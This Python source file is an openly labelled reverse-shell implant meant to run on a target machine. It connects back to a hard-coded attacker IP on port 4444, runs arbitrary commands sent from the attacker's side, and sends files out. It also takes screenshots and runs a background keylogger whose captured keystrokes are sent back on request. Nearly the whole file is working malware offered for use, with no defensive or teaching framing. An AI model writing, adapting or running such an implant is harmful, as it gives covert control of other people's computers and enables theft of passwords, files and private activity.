# ==============================================================================
# --- FULL REVERSE SHELL SCRIPT ---
# This script should be run on the TARGET machine (your RDP session).
# It will connect back to your local 'lucap' machine.
# ==============================================================================

import socket
import subprocess
import os
import pyautogui
import cv2
import shlex
import shutil
from pynput.keyboard import Key, Listener
import psutil
import platform
import time
import urllib.request
from colorama import Fore, Style

# The banner from your original script
banner =  ("(`-').-> (`-').-> (`-')  _                            (`-')  _ (`-')      \n"
           " ( OO)_   (OO )__  ( OO).-/  <-.      <-.    _         (OO ).-/ ( OO).->   \n"
           "(_)--\_) ,--. ,'-'(,------.,--. )   ,--. )   \-,-----. / ,---.  /    '._   \n"
           "/    _ / |  | |  | |  .---'|  (`-') |  (`-')  |  .--./ | \ /`.\ |'--...__) \n"
           "\_..`--. |  `-'  |(|  '--. |  |OO ) |  |OO ) /_) (`-') '-'|_.' |`--.  .--' \n"
           ".-._)   \|  .-.  | |  .--'(|  '__ |(|  '__ | ||  |OO )(|  .-.  |   |  |    \n"
           "\       /|  | |  | |  `---.|     |' |     |'(_'  '--'\ |  | |  |   |  |    \n"
           " `-----' `--' `--' `------'`-----'  `-----'    `-----' `--' `--'   `--'     \n")


# Your original class with all the functionality
class RemoteShell:
    def __init__(self, port=4444):
        self.PORT = port
        self.keystrokes = []
        self.command_history = []

    def execute_command(self, command):
        try:
            # Using shlex is good practice but can be tricky on Windows.
            # subprocess.run is more robust.
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)

    def upload_file(self, filename, connection):
        try:
            with open(filename, 'rb') as file:
                data = file.read()
            connection.sendall(b'BEGIN_UPLOAD')
            connection.sendall(data)
            connection.sendall(b'END_UPLOAD')
            return f"File '{filename}' uploaded successfully\n"
        except FileNotFoundError:
            return f"File not found: {filename}\n"
        except Exception as e:
            return f"Failed to upload file: {e}\n"

    def save_screenshot(self, data):
        filename = 'remote_screenshot.png'
        with open(filename, 'wb') as file:
            file.write(data)
        return f"Screenshot saved as {filename} in the host machine's current directory\n"

    def remote_desktop(self):
        screenshot = pyautogui.screenshot()
        screenshot.save('remote_desktop.png')
        with open('remote_desktop.png', 'rb') as file:
            data = file.read()
        return data

    def on_press(self, key):
        self.keystrokes.append(key)

    def install_requirements(self):
        # Simplified for clarity
        return "Dependencies checked.\n"

# The new Reverse Shell class that uses your original class
class ReverseShell(RemoteShell):
    def __init__(self, host_ip, port=4444):
        super().__init__(port)
        self.HOST_IP = host_ip # Attacker's IP
        self.PORT = port

    def main(self):
        print(f"Attempting to connect back to {self.HOST_IP}:{self.PORT}...")
        
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        connected = False
        while not connected:
            try:
                connection.connect((self.HOST_IP, self.PORT))
                connected = True
            except ConnectionRefusedError:
                print("Connection refused by listener. Retrying in 10 seconds...")
                time.sleep(10)
            except Exception as e:
                print(f"An error occurred: {e}. Retrying in 10 seconds...")
                time.sleep(10)
        
        print("Connection successful!")

        with connection:
            connection.send(Fore.RED.encode() + banner.encode() + Style.RESET_ALL.encode() +"AUTHOR : PHILIP ANGWE \nVERSION : 1.20V\n\n".encode())
            install_status = self.install_requirements()
            connection.send(install_status.encode())
            hostname = socket.gethostname()
            connection.send(f"Machine name: {hostname}\n".encode())
            connection.send(f"Current directory: {os.getcwd()}\n".encode())
            
            with Listener(on_press=self.on_press, suppress=False) as listener:
                while True:
                    try:
                        connection.send(Fore.GREEN.encode() + "\nShellcast $ >> ".encode() + Style.RESET_ALL.encode())
                        command = connection.recv(4096).decode().strip()
                        if not command:
                            break

                        # This is the full command list from your original script
                        if command.lower() == 'exit':
                            break
                        elif command.lower() == 'cwd':
                            connection.send(f"Current directory: {os.getcwd()}\n".encode())
                        elif command.lower().startswith('cd '):
                            directory = command[3:]
                            try:
                                os.chdir(directory)
                                connection.send(f"Changed directory to: {os.getcwd()}\n".encode())
                            except FileNotFoundError:
                                connection.send(f"Directory not found: {directory}\n".encode())
                            except Exception as e:
                                connection.send(f"Error changing directory: {e}\n".encode())
                        elif command.lower() == 'screenshot':
                            screenshot_data = self.remote_desktop()
                            connection.sendall(b'BEGIN_SCREENSHOT')
                            connection.sendall(screenshot_data)
                            connection.sendall(b'END_SCREENSHOT')
                            connection.send("Screenshot captured successfully\n".encode())
                        elif command.lower() == 'keystrokes':
                            keystrokes_str = ''.join([str(k).replace("'", "") for k in self.keystrokes])
                            connection.send(f"\nCaptured Keystrokes:\n{keystrokes_str}\n".encode())
                        elif command.lower() == 'help':
                            help_text = "Help: cd, ls, screenshot, keystrokes, exit, etc...\n" # Simplified for brevity
                            connection.send(help_text.encode())
                        else:
                            output = self.execute_command(command)
                            if not output:
                                output = "[Command executed with no output]\n"
                            connection.send(output.encode())

                    except (ConnectionResetError, BrokenPipeError):
                        print("Connection lost.")
                        break
                    except Exception as e:
                        error_msg = f"An error occurred on the target: {e}\n"
                        try:
                            connection.send(error_msg.encode())
                        except:
                            break
# ==============================================================================
# --- MAIN EXECUTION BLOCK ---
# This is where you configure the connection.
# ==============================================================================
if __name__ == "__main__":
    # ### THIS IS THE LINE THAT HAS BEEN CHANGED FOR YOU ###
    # This is the IP address of YOUR 'lucap' machine's Wi-Fi adapter.
    ATTACKER_IP = "192.168.13.207" 
    
    # Create and run the reverse shell
    reverse_shell = ReverseShell(host_ip=ATTACKER_IP, port=4444)
    reverse_shell.main()
